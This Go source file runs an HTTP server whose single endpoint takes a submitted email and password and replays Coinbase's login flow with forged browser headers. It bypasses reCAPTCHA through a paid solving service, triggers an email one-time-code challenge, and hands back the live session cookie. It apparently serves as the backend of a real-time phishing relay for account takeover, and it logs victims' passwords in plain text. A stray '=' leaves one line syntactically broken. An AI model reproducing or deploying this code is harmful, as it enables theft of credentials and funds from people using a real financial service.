package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/2captcha/2captcha-go"
)

type RequestBody struct {
	Email    string `json:"email"`
	Password string `json:"password"`
}

type ResponseBody struct {
	Message string `json:"message"`
}

func handlePostRequest(w http.ResponseWriter, r *http.Request) {
    var requestBody RequestBody
    err := json.NewDecoder(r.Body).Decode(&requestBody)
    if err != nil {
        http.Error(w, err.Error(), http.StatusBadRequest)
        return
    }
	startReq, err := http.NewRequest("GET", "https://login.coinbase.com/api/v1/start", nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	startReq.Header.Set("start_accept", "application/json")
	startReq.Header.Set("start_accept-language", "en-US,en;q=0.9,it;q=0.8")
	startReq.Header.Set("start_content-type", "application/json")
	startReq.Header.Set("start_sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"")
	startReq.Header.Set("start_sec-ch-ua-mobile", "?0")
	startReq.Header.Set("start_sec-ch-ua-platform", "\"Windows\"")
	startReq.Header.Set("start_sec-fetch-dest", "empty")
	startReq.Header.Set("start_sec-fetch-mode", "cors")
	startReq.Header.Set("start_sec-fetch-site", "same-origin")
	startReq.Header.Set("start_x-cb-is-logged-in", "false")
	startReq.Header.Set("start_x-cb-pagekey", "signin")
	startReq.Header.Set("start_x-cb-platform", "web")
	startReq.Header.Set("start_x-cb-project-name", "unified_login")
	startReq.Header.Set("start_x-cb-session-uuid", "unknown")
	startReq.Header.Set("start_x-cb-ujs", "")

	startclient := http.Client{}
	sresp, err := startclient.Do(startReq)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer sresp.Body.Close()

	fmt.Println("Response Status:", sresp.Status)
	var sessionCookie *http.Cookie
	for _, cookie := range sresp.Cookies() {
		if cookie.Name == "login-session" {
			sessionCookie = cookie
			break
		}
	}

	if sessionCookie != nil {
		fmt.Println("Value of session cookie:", sessionCookie.Value)
	} else {
		fmt.Println("Session cookie not found in the response.")
	}
	//------------------------------------------------------------------
	urlvc := "https://login.coinbase.com/api/v1/verify-identification"
	payloadvc := []byte(`{"recaptcha_token":"","proof_token":""}`)

	reqvc, err := http.NewRequest("POST", urlvc, bytes.NewBuffer(payloadvc))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	reqvc.Header.Set("accept", "application/json")
	reqvc.Header.Set("accept-language", "en-US,en;q=0.9,it;q=0.8")
	reqvc.Header.Set("content-type", "application/json")
	reqvc.Header.Set("sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"")
	reqvc.Header.Set("sec-ch-ua-mobile", "?0")
	reqvc.Header.Set("sec-ch-ua-platform", "\"Windows\"")
	reqvc.Header.Set("x-cb-is-logged-in", "true")
	reqvc.Header.Set("x-cb-pagekey", "signin")
	reqvc.Header.Set("x-cb-platform", "web")
	reqvc.Header.Set("x-cb-project-name", "unified_login")
	reqvc.Header.Set("x-cb-ujs", "")
	cookie := &http.Cookie{
		Name:  "login-session",
		Value: sessionCookie.Value,
	}
	reqvc.AddCookie(cookie)
	reqvc.Header.Set("referrer", "https://login.coinbase.com/")
	reqvc.Header.Set("referrerPolicy", "strict-origin")

	reqvc.Header.Set("sec-fetch-dest", "empty")
	reqvc.Header.Set("sec-fetch-mode", "cors")
	reqvc.Header.Set("sec-fetch-site", "same-origin")

	reqvc.Header.Set("credentials", "include")

	clientvc := &http.Client{}
	respvc, err := clientvc.Do(reqvc)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer respvc.Body.Close()

	bodyvc, err := ioutil.ReadAll(respvc.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	fmt.Println(string(bodyvc))
	cookies := respvc.Cookies()
	for _, cookie := range cookies {
		if cookie.Name == "login-session" {
			fmt.Println("Value of login-session cookie:", cookie.Value)
		}
	}
	clientt := api2captcha.NewClient("2CATPATCHA KEY")
	cap := api2captcha.ReCaptcha{
		SiteKey: "6LcTV7IcAAAAAI1CwwRBm58wKn1n6vwyV1QFaoxr",
		Url:     "https://login.coinbase.com/signin",
		Version: "v3",
		Action:  "password",
		Score:   0.7,
	}
	code, err := clientt.Solve(cap.ToRequest())
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("code " + code)
	url := "https://login.coinbase.com/api/two-factor/v1/verify"
    println(requestBody.Email)
    println(requestBody.Password)
	payload := map[string]interface{}{
		"password": map[string]string{
			"email":    requestBody.Email,
			"password": requestBody.Password,
		},
		"constraints": map[string]interface{}{
			"mode":  "ALLOW",
			"types": []string{"PASSWORD", "PASSKEY", "OAUTH_GOOGLE", "OAUTH_APPLE"},
		},
		"action":    "web-UnifiedLogin-IdentificationPrompt",
		"bot_token": code,
	}
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonPayload))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Referer", "https://login.coinbase.com/")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Identity-Version", "verify@5.5.0")
	req.Header.Set("Origin", "https://login.coinbase.com")
	req.Header.Set("DNT", "1")
	req.Header.Set("Sec-GPC", "1")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	cookievar := &http.Cookie{
		Name:  "login-session",
		Value: cookie.Value,
	}
	req.AddCookie(cookievar)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

    if(resp.StatusCode == 400){
        response := ResponseBody{
            Message: fmt.Sprintf("Captcha Failed"),
        }
        jsonResponse, err := json.Marshal(response)
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(http.StatusOK)
        w.Write(jsonResponse)
    }
   

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}
	var responseData map[string]interface{}
	if err := json.Unmarshal([]byte(body), &responseData); err != nil {
		fmt.Println("Error parsing JSON:", err)
		return
	}
	proofToken, ok := responseData["proof_token"].(string)
	if !ok {
		fmt.Println("Proof token not found or not a string")
		return
	}
	println(proofToken)

	urlVerid := "https://login.coinbase.com/api/v1/verify-identification"
	payloadVerid := []byte(fmt.Sprintf(`{"recaptcha_token":"","proof_token":"%s"}`, proofToken))
	reqVerid, errVerid := http.NewRequest("POST", urlVerid, bytes.NewBuffer(payloadVerid))
	if errVerid != nil {
		fmt.Println("Error creating request:", errVerid)
		return
	}
	reqVerid.Header.Set("Cookie", "login-session="+cookie.Value)
	reqVerid.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0")
	reqVerid.Header.Set("Accept", "application/json")
	reqVerid.Header.Set("Accept-Language", "en-US,en;q=0.5")
	reqVerid.Header.Set("Referer", "https://login.coinbase.com/")
=	reqVerid.Header.Set("X-Cb-Is-Logged-In", "true")
	reqVerid.Header.Set("X-Cb-Pagekey", "signin")
	reqVerid.Header.Set("X-Cb-Ujs", "")
	reqVerid.Header.Set("X-Cb-Platform", "web")
	reqVerid.Header.Set("X-Cb-Project-Name", "unified_login")
	reqVerid.Header.Set("Content-Type", "application/json")
	reqVerid.Header.Set("Content-Length", fmt.Sprint(len(payloadVerid)))
	reqVerid.Header.Set("Origin", "https://login.coinbase.com")
	reqVerid.Header.Set("Sec-Fetch-Dest", "empty")
	reqVerid.Header.Set("Sec-Fetch-Mode", "cors")
	reqVerid.Header.Set("Sec-Fetch-Site", "same-origin")
	reqVerid.Header.Set("Te", "trailers")

	clientVerid := &http.Client{}
	respVerid, errVerid := clientVerid.Do(reqVerid)
	if errVerid != nil {
		fmt.Println("Error sending request:", errVerid)
		return
	}
	defer respVerid.Body.Close()

	bodyVerid, errVerid := ioutil.ReadAll(respVerid.Body)
	if errVerid != nil {
		fmt.Println("Error reading response body:", errVerid)
		return
	}
	facookie := respVerid.Cookies()
	var realfacookieValue string
	for _, realfacookie := range facookie {
		if realfacookie.Name == "login-session" {
			fmt.Println("Value of login-session cookie:", realfacookie.Value)
			realfacookieValue = realfacookie.Value
		}
	}
	fmt.Println("Response Status:", respVerid.Status)
	fmt.Println("Response Body:", string(bodyVerid))
	fmt.Println(realfacookieValue)
	otpRequestData := map[string]interface{}{
		"second_factor_type": "EMAIL",
		"constraints": map[string]interface{}{
			"mode":  "ALLOW",
			"types": []string{"NO_2FA", "SMS", "EMAIL", "TOTP", "U2F", "IDV", "RECOVERY_CODE", "PUSH", "PASSKEY", "SECURITY_QUESTION"},
		},
		"action": "web-UnifiedLogin-SecondFactorPrompt",
	}

	otpJsonData, err := json.Marshal(otpRequestData)
	if err != nil {
		panic(err)
	}

	otpReq, err := http.NewRequest("POST", "https://login.coinbase.com/api/two-factor/v1/challenge", bytes.NewBuffer(otpJsonData))
	if err != nil {
		panic(err)
	}
	otpReq.Header.Set("Content-Type", "application/json")
	otpReq.Header.Set("authority", "login.coinbase.com")
	otpReq.Header.Set("accept", "application/json")
	otpReq.Header.Set("accept-encoding", "gzip, deflate, br")
	otpReq.Header.Set("accept-language", "en-US,en;q=0.9,it;q=0.8")
	otpReq.Header.Set("identity-version", "verify@5.7.0")
	otpReq.Header.Set("origin", "https://login.coinbase.com")
	otpReq.Header.Set("referer", "https://login.coinbase.com/")
	otpReq.Header.Set("sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"")
	otpReq.Header.Set("sec-ch-ua-mobile", "?0")
	otpReq.Header.Set("sec-ch-ua-platform", "\"Windows\"")
	otpReq.Header.Set("sec-fetch-dest", "empty")
	otpReq.Header.Set("sec-fetch-mode", "cors")
	otpReq.Header.Set("sec-fetch-site", "same-origin")
	otpReq.Header.Set("Cookie", "login-session="+realfacookieValue)

	otpClient := &http.Client{}
	otpResp, err := otpClient.Do(otpReq)
	if err != nil {
		panic(err)
	}
	defer otpResp.Body.Close()

	println(otpResp.StatusCode)
    response := ResponseBody{
        Message: fmt.Sprintf(realfacookieValue),
    }
	jsonResponse, err := json.Marshal(response)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(jsonResponse)
}
func main() {
	http.HandleFunc("/api/sendotp", handlePostRequest)
	fmt.Println("Server started on port 8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
